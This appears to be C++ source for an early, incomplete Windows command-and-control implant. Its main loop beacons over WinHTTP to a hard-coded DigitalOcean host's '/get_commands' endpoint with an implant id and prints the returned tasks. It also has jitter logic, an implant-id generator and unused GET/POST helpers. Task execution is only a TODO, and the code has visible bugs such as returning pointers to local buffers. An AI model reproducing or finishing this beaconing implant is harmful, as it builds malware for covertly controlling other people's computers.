/**post request, try initial communcation with c2, when working->
every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->post to payload**/
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <iostream>
#include <windows.h>
#include <winhttp.h>
#include <future> 
#define SERVERNAME "placeholder"
#define SLEEP 60000
#define serverpublickey "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzx4uIFIDB0pWvgR/JxYiS1CFOgxV4zWWprRE/Te48cZSC49SHXAya/gKIHO66/7I1yFNiuLhcqtuDx2Pt1fSK1Hw2neXkFRnbGDJXLkGldGe+7Uqjw1XrTT24QXRjAFE/jmVm3FtvrsHloSQZO5mvrHOzHsd+AH4i/HK3rDQ7U6vgQfroPpShD2mK6HPYsQxHTTiz+SMGD3VpG49aUk7YLxR2pfVA/x7vo7MLXDwYI2znwMcu0C5MweN4f7x7C0aop6qFQZVef1/2TbdeSEdri6oWAkwFWA8PCiQaIXvrnjOgm4zMDtFE3CHbcl335ArDQoeCPdeFjIIubGOlUfmAFHJ7Xntb/q2mgDz3VZ9ox7Jzd/ZktrODVyO8VTL3Wt4nQx48fSNU8bWfrTlrKmXwA/2+mvhNjFBRF6R5a7JztsrZkQ1Y1FbMstkw1+Q80mLsLowAfE2VerKjCd7484XXpDtvEdaPkPiYgfRTotrhkkpkcKlLCvdArbNxDnkv328= sumthing"


size_t writeFunction(void *ptr, size_t size, size_t nmemb, std::string *data)
{
    data->append((char *)ptr, size * nmemb);
    return size * nmemb;
}

void tasks()
{
    while (1)
    {
        Sleep(SLEEP);
    }
}

std::string makeHttpRequest(std::string fqdn, int port, std::string uri, int implant_id) {
    // Used Windows documentation for every function
    int temp = 0;
    // LENGTH NEEDS TO BE SCALED DEPENDING ON OUR RANGE FOR IMPLANT_ID
    if(implant_id>10){
        temp = 2;
    }else{
        temp=1;
    }
    int length = 7 + temp;
    char postdata[11];
    sprintf(postdata, "{\"id\":%d}", implant_id);

    LPCWSTR additionalHeaders = L"Content-Type: application/json\r\n";


    /* Converts from string to wstring to LPCWSTR
       https://stackoverflow.com/questions/27220/how-to-convert-stdstring-to-lpcwstr-in-c-unicode
    */
    std::string result;
    std::wstring fqdn_wstring(fqdn.begin(), fqdn.end());
    LPCWSTR fqdnptr = fqdn_wstring.c_str();

    // The WinHttpOpen function initializes, for an application, the use of WinHTTP functions and returns a WinHTTP-session handle.
    HINTERNET hSession = WinHttpOpen(fqdnptr, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    if (!hSession) {
        return "WinHttpOpen Failed";
    }

    // The WinHttpConnect function specifies the initial target server of an HTTP request and returns an HINTERNET connection handle to an HTTP session for that initial target.
    HINTERNET hConnect = WinHttpConnect(hSession, fqdnptr, port, 0);

    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return "WinHttpConnect Failed";

    }

    // GET string for WinHttpOpenRequest
    std::string get = "POST";
    std::wstring get_wstring(get.begin(), get.end());
    LPCWSTR getptr = get_wstring.c_str();

    std::wstring get_uri(uri.begin(), uri.end());
    LPCWSTR uriptr = get_uri.c_str();

    // The WinHttpOpenRequest function creates an HTTP request handle.
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, getptr, uriptr, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

    if (!hRequest) {
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);
        return "WinHttpOpenRequest Failed";
    }
    //WinHttpAddRequestHeaders(hRequest, additionalHeaders, -1, WINHTTP_ADDREQ_FLAG_ADD);

    // The WinHttpSendRequest function sends the specified request to the HTTP server.
    if (!WinHttpSendRequest(hRequest, additionalHeaders, -1, postdata, length, length, 0)) {
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hRequest);
        return "WinHttpSendRequest Failed";
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hRequest);
        return "WinHttpReceiveResponse Failed";
    }


    DWORD lpdwNumberOfBytesAvailable = 0;
    LPSTR lpBuffer = NULL;

    do {

        lpdwNumberOfBytesAvailable = 0;

        if (!WinHttpQueryDataAvailable(hRequest, &lpdwNumberOfBytesAvailable)) {
            WinHttpCloseHandle(hSession);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hRequest);
            return "WinHttpQueryDataAvailable Failed";
        }

        // Initializing Buffer with 4096 bytes
        lpBuffer = new char[4096];
        ZeroMemory(lpBuffer, 4096);

        DWORD lpdwNumberOfBytesRead = 0;

        if (!WinHttpReadData(hRequest, lpBuffer, lpdwNumberOfBytesAvailable, &lpdwNumberOfBytesRead)) {
            WinHttpCloseHandle(hSession);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hRequest);
            return "WinHttpReadData Failed";
        }

        result = result + lpBuffer;
        delete[] lpBuffer;

    } while (lpdwNumberOfBytesAvailable > 0);

    WinHttpCloseHandle(hSession);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hRequest);
    return result;

}

// -> PARSE TASK IS FINISHED IN PARSE.CPP
// auto parseTasks(auto toParse){

// return 1;
// }

//TODO
// auto executeTasks(auto tasks){
    
//     return 1;
// }


std::string getTasks(int implant_id){
    std::string item = makeHttpRequest("sea-lion-app-f5nrq.ondigitalocean.app", 443, "/get_commands", implant_id);
    return item;
}

void runLoop(bool isRunning){
    while (isRunning) {
        try {
            //WAS FOR TESTING PURPOSES - CHANGE LATER
            int implant_id = 1;
            std::string getting = getTasks(implant_id);

            std::cout << getting << std::endl;
            //WHEN WE GET THE FORMAT, THEN PARSE
            //THEN AFTER PARSE FEED INTO EXECUTE

            //const auto serverResponse = std::async(std::launch::async, getTasks);
            //auto parsedTasks = parseTasks(serverResponse.get());
            //auto success = executeTasks(parsedTasks);
        }
        catch (const std::exception& e) {
            printf("\nError in runLoop: %s\n", e.what());
        }

        //SET SLEEP HERE 
}

}

// TO DO - UNSURE OF WHAT THIS IS. IS THIS POSTING BACK TO C2?
int sendresults()
{
    while (1)
    {
        //create jitter from 0 to 5 mins 
        int jitter;
        jitter=rand()*10; 
        Sleep(SLEEP+jitter);
        // Send results, check response
        // If good response break
    }
}

// INITIALLY MADE FOR RANDOM HEX - WE CAN CHANGE TO RANDOM INT
// IF WE CONTINUE TO USE RANDOM HEX - HTTP REQUEST NEEDS TO BE CHANGED

// Random Implant ID in hex using rand()
// https://stackoverflow.com/questions/33325814/how-to-loop-generate-random-256bit-hex-in-c-or-c
char *random_id()
{
    char random_hex[32 + 1];
    char *random_hexptr = random_hex;

    srand(time(0));
    for (int i = 0; i < 32; i++)
    {
        sprintf(random_hex + i, "%x", rand() % 32);
    }

    return random_hexptr;
}

// INITIALLY MADE TO CREATE A POINTER TO AN IMPLANT ID STRING
// NOT SURE IF STILL NEEDED
char *make_base_payload(char *implant_id)
{
    char payload[51] = "{\"implant_id\": }";
    char *payloadptr = payload;
    strcat(payload, implant_id);
    return payloadptr;
}

int main(int argc, char *argv[])
{
    runLoop(true);
    return 0;
}












/* Code not used 


LPSTR makeGetRequest(LPCWSTR servername, LPCWSTR subdirectory){
    HINTERNET httpsession = WinHttpOpen(
        L"GenericAPICaller",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    if(httpsession!=NULL){
        HINTERNET connectsesh = WinHttpConnect(
            httpsession,
            servername,
            INTERNET_DEFAULT_HTTPS_PORT,
            0);
        if (connectsesh != NULL)
        {
            HINTERNET request = WinHttpOpenRequest(
                connectsesh,
                L"GET",
                subdirectory,
                NULL,
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                WINHTTP_FLAG_SECURE);
            if (request != NULL)
            {
                BOOL idrequest = WinHttpSendRequest(
                    request,
                    WINHTTP_NO_ADDITIONAL_HEADERS,
                    0,
                    NULL,
                    0,
                    0,
                    0);
                if (idrequest == TRUE)
                {
                    BOOL response = WinHttpReceiveResponse(
                        request,
                        NULL);
                    if(response==true)
                    {
                        DWORD bytesneeded;
                        BOOL query= WinHttpQueryDataAvailable(
                        request,
                        &bytesneeded);
                        LPSTR returnbuffer=new char[bytesneeded+1];
                        if(query==TRUE){
                            if(returnbuffer){
                                ZeroMemory(returnbuffer, bytesneeded+1);
                                BOOL dataread=WinHttpReadData(
                                request,
                                returnbuffer,
                                bytesneeded+1,
                                NULL);
                                if(dataread==TRUE){
                                    return returnbuffer;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}


LPSTR makePostRequest(LPCWSTR servername, LPCWSTR subdirectory, const char *postdata)
{
    DWORD datalen = strlen(postdata);
    HINTERNET httpsession = WinHttpOpen(
        L"GenericAPICaller",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    if (httpsession != NULL)
    {
        HINTERNET connectsesh = WinHttpConnect(
            httpsession,
            servername,
            INTERNET_DEFAULT_HTTPS_PORT,
            0);
        if (connectsesh != NULL)
        {
            HINTERNET request = WinHttpOpenRequest(
                connectsesh,
                L"POST",
                subdirectory,
                NULL,
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                WINHTTP_FLAG_SECURE);
            if (request != NULL)
            {   
               
                
                if(WinHttpAddRequestHeaders(request, L"\"Content-Type\": \"application/json\"", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD)){
                    printf("YOU SET HEADER");
                }

        
                BOOL idrequest = WinHttpSendRequest(
                    request,
                    WINHTTP_NO_ADDITIONAL_HEADERS,
                    0,
                    (LPVOID)postdata,
                    datalen,
                    datalen,
                    0);
                if (idrequest == TRUE)
                {
                    BOOL response = WinHttpReceiveResponse(
                        request,
                        NULL);
                    if (response == true)
                    {
                        DWORD bytesneeded;
                        BOOL query = WinHttpQueryDataAvailable(
                            request,
                            &bytesneeded);
                        LPSTR returnbuffer = new char[bytesneeded + 1];
                        if (query == TRUE)
                        {
                            if (returnbuffer)
                            {
                                ZeroMemory(returnbuffer, bytesneeded + 1);
                                BOOL dataread = WinHttpReadData(
                                    request,
                                    returnbuffer,
                                    bytesneeded + 1,
                                    NULL);
                                if (dataread == TRUE)
                                {
                                    return returnbuffer;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
 Code not used */